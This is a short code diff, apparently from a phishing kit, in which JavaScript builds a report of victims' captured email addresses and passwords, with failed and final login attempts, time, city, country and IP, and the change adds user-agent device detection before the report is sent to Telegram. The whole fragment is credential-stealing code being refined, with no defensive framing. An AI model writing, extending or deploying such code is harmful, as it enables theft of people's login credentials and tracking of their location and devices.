@@ -162,9 +162,24 @@
       message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
       message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
     });
-    message += `🕒 Time: ${now}\n`;
-    message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
-    message += `📡 IP: ${ip}`;
+    // Detect device type
+const ua = navigator.userAgent;
+let deviceType = "Unknown Device";
+
+if (/mobile/i.test(ua)) {
+  deviceType = "📱 Mobile";
+} else if (/tablet/i.test(ua)) {
+  deviceType = "📱 Tablet";
+} else if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
+  deviceType = "📱 Tablet";
+} else {
+  deviceType = "💻 Desktop";
+}
+
+message += `🕒 Time: ${now}\n`;
+message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
+message += `📡 IP: ${ip}\n`;
+message += `🖥️ Device: ${deviceType}`;
 
     // Try to send to Telegram
     try {
